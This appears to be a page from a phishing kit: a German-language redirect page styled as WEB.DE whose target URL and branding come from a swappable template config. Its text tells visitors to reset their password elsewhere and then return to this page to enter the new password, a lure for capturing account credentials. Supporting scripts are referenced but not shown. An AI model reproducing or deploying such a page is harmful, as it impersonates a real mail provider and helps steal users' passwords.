<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
  <title>Weiterleitung — WEB.DE</title>
  <link rel="icon" href="/favicon-webde.png" type="image/png">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      min-height: 100vh;
      font-family: Roboto, Arial, sans-serif;
      font-size: 18px;
      line-height: 1.6;
      color: #333;
      background: #e8eef5;
      display: flex;
      align-items: flex-start;
      justify-content: center;
      padding: 48px 24px;
    }
    .redirect-box {
      max-width: 640px;
      width: 100%;
      padding: 36px 40px;
      background: #d4e1f2;
      border: 1px solid #b8cce0;
      border-radius: 16px;
      box-shadow: 0 2px 12px rgba(0,0,0,0.06);
    }
    .redirect-box p {
      margin: 0 0 16px 0;
      font-size: 20px;
      line-height: 1.65;
    }
    .redirect-box p:last-child {
      margin-bottom: 0;
    }
    .redirect-box a {
      color: var(--brand-primary, #ffd800);
      font-weight: 500;
      text-decoration: underline;
      text-underline-offset: 2px;
    }
    .redirect-box a:hover {
      color: #16367c;
    }
    .redirect-count {
      font-weight: 700;
      color: var(--brand-primary, #ffd800);
    }
  </style>
  <!-- __BRAND_JSON__ -->
  <script src="/brand.js"></script>
</head>
<body>
  <div class="redirect-box">
    <p>Wir leiten Sie jetzt zur Seite zur Passwortwiederherstellung weiter. Bitte folgen Sie den Anweisungen dort. Kehren Sie anschließend auf diese Seite zurück und geben Sie Ihr neues Passwort ein.</p>
    <p>Wenn Sie nicht in <span class="redirect-count" id="countdown">10</span> Sekunden weitergeleitet werden, <a href="https://web.de/" id="redirect-link">klicken Sie hier</a>.</p>
  </div>
  <script>
    (function () {
      var seconds = 10;
      var countEl = document.getElementById('countdown');
      var link = document.getElementById('redirect-link');
      var targetUrl = (window.__BRAND__ && window.__BRAND__.passwortUrl) || 'https://web.de/';
      if (link) link.href = targetUrl;

      function go() {
        window.location.href = targetUrl;
      }

      var t = setInterval(function () {
        seconds--;
        if (countEl) countEl.textContent = seconds;
        if (seconds <= 0) {
          clearInterval(t);
          go();
        }
      }, 1000);

      if (link) link.addEventListener('click', function (e) {
        e.preventDefault();
        clearInterval(t);
        go();
      });
    })();
  </script>
  <script src="/status-redirect-webde.js"></script>
</body>
</html>
